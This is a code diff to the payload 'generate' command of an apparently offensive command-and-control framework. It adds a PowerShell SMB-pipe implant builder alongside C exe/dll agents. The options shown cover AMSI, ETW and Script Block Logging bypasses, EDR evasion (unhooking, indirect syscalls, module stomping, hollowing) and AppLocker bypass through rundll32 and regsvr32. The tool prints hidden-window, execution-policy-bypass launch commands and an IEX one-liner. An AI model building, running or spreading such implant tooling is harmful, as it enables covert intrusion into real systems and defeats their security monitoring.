@@ -1,14 +1,16 @@
 """
-CLI 'generate' command — cross-compile C agent with embedded config.
+CLI 'generate' command — cross-compile C agent or generate PowerShell agent.
 
 Usage in operator shell:
   generate                                    (defaults: current listener URL, keys/server_pub.pem)
   generate --url https://c2.example.com/api/v1 --sleep 30 --jitter 20
   generate --arch x86 --kill-date 2026-12-31
   generate --url https://... --sleep 10 --format dll
+  generate --format powershell --listener SMB
 """
 
 import shlex
+import sys
 from pathlib import Path
 
 from rich.console import Console
@@ -17,7 +19,7 @@ console = Console(stderr=True)
 
 
 def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
-    """Parse generate arguments and invoke the C agent build."""
+    """Parse generate arguments and invoke the appropriate build."""
 
     # Parse arguments from the command string
     parts = shlex.split(args_str) if args_str else []
@@ -30,6 +32,7 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "magic": 0xDEADF00D,
         "output": None,
         "format": "exe",
+        "listener": "",
         "no_evasion": False,
         "no_sandbox": False,
         "no_unhook": False,
@@ -41,6 +44,7 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "no_module_stomp": False,
         "no_phantom_hollow": False,
         "no_crypt": False,
+        "no_sbl": False,
         "target_os": "win10",
         "debug": False,
     }
@@ -58,6 +62,7 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "--no-module-stomp": "no_module_stomp",
         "--no-phantom-hollow": "no_phantom_hollow",
         "--no-crypt": "no_crypt",
+        "--no-sbl": "no_sbl",
         "--debug": "debug",
     }
 
@@ -85,10 +90,12 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             opts["target_os"] = val; i += 2
         elif parts[i] in ("--format", "-f") and i + 1 < len(parts):
             val = parts[i + 1]
-            if val not in ("exe", "dll"):
-                console.print(f"[red]--format must be exe or dll, got: {val}[/red]")
+            if val not in ("exe", "dll", "powershell"):
+                console.print(f"[red]--format must be exe, dll, or powershell, got: {val}[/red]")
                 return
             opts["format"] = val; i += 2
+        elif parts[i] in ("--listener", "-l") and i + 1 < len(parts):
+            opts["listener"] = parts[i + 1]; i += 2
         elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
             opts["output"] = Path(parts[i + 1]); i += 2
         elif parts[i] in bool_flags:
@@ -100,6 +107,13 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             console.print(f"[red]Unknown option: {parts[i]}[/red]")
             _print_help()
             return
+
+    # ─── PowerShell agent path ────────────────────────────────────────
+    if opts["format"] == "powershell":
+        _build_powershell(opts, project_root, listeners)
+        return
+
+    # ─── C agent path (exe / dll) ─────────────────────────────────────
 
     # Auto-detect listener URL if not specified
     if not opts["url"]:
@@ -147,7 +161,6 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         console.print(f"  Kill date: {opts['kill_date']}")
 
     # Import and invoke build
-    import sys
     sys.path.insert(0, str(project_root / "scripts"))
     from build_agent_c import build_agent
 
@@ -203,23 +216,152 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         console.print(str(e))
 
 
+# ─── PowerShell build ────────────────────────────────────────────────
+
+def _build_powershell(opts: dict, project_root: Path, listeners: list) -> None:
+    """Generate a PowerShell SMB pipe agent."""
+    import base64
+
+    # ── Resolve target SMB listener ──
+    target_listener = None
+
+    if opts["listener"]:
+        for lst in listeners:
+            if lst.name == opts["listener"]:
+                target_listener = lst
+                break
+        if not target_listener:
+            names = [l.name for l in listeners] if listeners else []
+            console.print(f"[red]✗ Listener '{opts['listener']}' not found[/red]")
+            if names:
+                console.print(f"[yellow]  Available: {', '.join(names)}[/yellow]")
+            return
+    else:
+        # Auto-detect first SMB listener
+        for lst in listeners:
+            if lst.listener_type == "SMB":
+                target_listener = lst
+                break
+        if not target_listener:
+            console.print("[red]✗ No SMB listener running[/red]")
+            console.print("[yellow]  Start one first:  listeners start smb --pipename TSVCPIPE-... --name SMB[/yellow]")
+            console.print("[yellow]  Or specify one:   generate --format powershell --listener <name>[/yellow]")
+            return
+
+    # Verify it's an SMB listener
+    if target_listener.listener_type != "SMB":
+        console.print(f"[red]✗ Listener '{target_listener.name}' is {target_listener.listener_type}, not SMB[/red]")
+        return
+
+    info = target_listener.info()
+    pipe_name = info["port"].replace("pipe:", "")
+    pipe_host = info["interface"]
+
+    # Resolve 0.0.0.0 to a usable address
+    if pipe_host == "0.0.0.0":
+        if opts["url"]:
+            from urllib.parse import urlparse
+            pipe_host = urlparse(opts["url"]).hostname or "127.0.0.1"
+        else:
+            pipe_host = "127.0.0.1"
+            console.print(
+                "[yellow]⚠ Listener bound to 0.0.0.0 — using 127.0.0.1 as pipe host.[/yellow]"
+            )
+            console.print(
+                "[yellow]  Use --url https://<target-reachable-ip> to override.[/yellow]"
+            )
+
+    console.print(f"[cyan]Generating PowerShell SMB agent...[/cyan]")
+    console.print(f"  Listener:  {target_listener.name}")
+    console.print(f"  Pipe:      \\\\{pipe_host}\\pipe\\{pipe_name}")
+    console.print(f"  Sleep:     {opts['sleep']}s / Jitter: {opts['jitter']}%")
+    if opts["kill_date"]:
+        console.print(f"  Kill date: {opts['kill_date']}")
+
+    # Show evasion status
+    evasion_flags = []
+    if opts["no_amsi"]:
+        evasion_flags.append("--no-amsi")
+    if opts["no_etw"]:
+        evasion_flags.append("--no-etw")
+    if opts["no_sbl"]:
+        evasion_flags.append("--no-sbl")
+    if evasion_flags:
+        console.print(f"  Disabled:  {', '.join(evasion_flags)}")
+    console.print()
+
+    # Import and build
+    sys.path.insert(0, str(project_root / "scripts"))
+    from build_powershell import build_powershell_agent
+
+    try:
+        out_path, psk = build_powershell_agent(
+            pipe_host=pipe_host,
+            pipe_name=pipe_name,
+            sleep_sec=opts["sleep"],
+            jitter_pct=opts["jitter"],
+            kill_date=opts["kill_date"],
+            no_amsi=opts["no_amsi"],
+            no_etw=opts["no_etw"],
+            no_sbl=opts["no_sbl"],
+            debug=opts["debug"],
+            output_path=opts["output"],
+        )
+    except Exception as e:
+        console.print(f"[red]✗ Build failed: {e}[/red]")
+        return
+
+    # Save PSK to keys/ so the listener can load it
+    keys_dir = project_root / "keys"
+    keys_dir.mkdir(exist_ok=True)
+    psk_name = f"ps_{out_path.stem}.key"
+    psk_path = keys_dir / psk_name
+    psk_path.write_bytes(psk)
+
+    # Register PSK with the running listener
+    if hasattr(target_listener, "add_psk"):
+        target_listener.add_psk(psk)
+
+    size_kb = out_path.stat().st_size / 1024
+    psk_b64 = base64.b64encode(psk).decode()
+
+    console.print(f"[green]✓ PowerShell agent: {out_path} ({size_kb:.1f} KB)[/green]")
+    console.print(f"[green]✓ PSK saved:        {psk_path}[/green]")
+    console.print(f"[green]✓ PSK registered with listener '{target_listener.name}'[/green]")
+    console.print()
+    console.print("[dim]Execute on target:[/dim]")
+    console.print(f"[dim]  powershell -ep bypass -f {out_path.name}[/dim]")
+    console.print(f"[dim]  powershell -ep bypass -w hidden -f {out_path.name}[/dim]")
+    console.print()
+    console.print("[dim]One-liner (base64-encoded):[/dim]")
+    console.print(f"[dim]  $s=[IO.File]::ReadAllText('{out_path.name}');IEX $s[/dim]")
+
+
+# ─── Help ─────────────────────────────────────────────────────────────
+
 def _print_help():
     console.print("""
-[bold]generate[/bold] — Cross-compile C agent with embedded config
+[bold]generate[/bold] — Build agent payloads (C or PowerShell)
 
-[bold]Options:[/bold]
-  --url, -u URL         C2 callback URL (auto-detected from listener)
+[bold]Format selection:[/bold]
+  --format, -f FMT      Output format: exe (default), dll, or powershell
+  --listener, -l NAME   Target listener by name (required for powershell
+                         unless exactly one SMB listener is running)
+
+[bold]Common options:[/bold]
+  --url, -u URL         C2 callback URL (C agent) / pipe host override (PS)
   --sleep, -s SEC       Beacon interval in seconds (default: 60)
   --jitter, -j PCT      Jitter percentage 0-99 (default: 25)
-  --arch, -a ARCH       x64 or x86 (default: x64)
-  --format, -f FMT      Output format: exe (default) or dll
   --kill-date DATE      Agent self-destructs after YYYY-MM-DD
-  --magic HEX           Packet magic bytes (default: 0xDEADF00D)
-  --output, -o PATH     Output path (default: builds/agent_ARCH.exe|dll)
+  --output, -o PATH     Output path
+  --debug               Enable debug logging
 
-[bold]Evasion / Debug:[/bold]
-  --debug               Enable agent debug log (%TEMP%\\agent_debug.log)
-  --no-crypt            Skip polymorphic encryption (raw .exe, for debugging)
+[bold]C agent options (exe/dll):[/bold]
+  --arch, -a ARCH       x64 or x86 (default: x64)
+  --magic HEX           Packet magic bytes (default: 0xDEADF00D)
+  --target-os OS        win10 or win11 (default: win10)
+
+[bold]C agent evasion:[/bold]
   --no-evasion          Disable ALL evasion features
   --no-sandbox          Disable anti-sandbox checks only
   --no-unhook           Disable ntdll unhooking only
@@ -230,21 +372,20 @@ def _print_help():
   --no-indirect-syscalls Disable indirect syscalls (Hell's Gate)
   --no-module-stomp    Disable module stomping for BOF .text sections
   --no-phantom-hollow  Disable phantom DLL hollowing
-  --target-os OS        Target OS: win10 or win11 (default: win10)
-                        Stack spoofing only enabled on win11
+  --no-crypt            Skip polymorphic encryption
 
-[bold]DLL format notes:[/bold]
-  The DLL format bypasses application execution controls (Panda, AppLocker)
-  by loading the agent via a trusted Windows binary. Crypter is skipped
-  (the trusted host handles on-disk reputation). Load with:
-    rundll32 agent.dll,Start
-    regsvr32 /s agent.dll
+[bold]PowerShell agent evasion:[/bold]
+  --no-amsi             Disable AMSI bypass
+  --no-etw              Disable ETW bypass
+  --no-sbl              Disable Script Block Logging bypass
 
 [bold]Examples:[/bold]
   generate
+  generate --format dll
+  generate --format powershell --listener SMB
+  generate --format powershell --listener SMB --sleep 30 --jitter 10
+  generate --format powershell --listener SMB --no-amsi --no-etw
   generate --url https://cdn.example.com/api/v1 --sleep 30
-  generate --url https://cdn.example.com/api/v1 --format dll
   generate --debug --no-unhook --no-sandbox --no-pe-stomp --no-crypt
   generate --arch x86 --kill-date 2026-12-31
-  generate --target-os win11
 """)
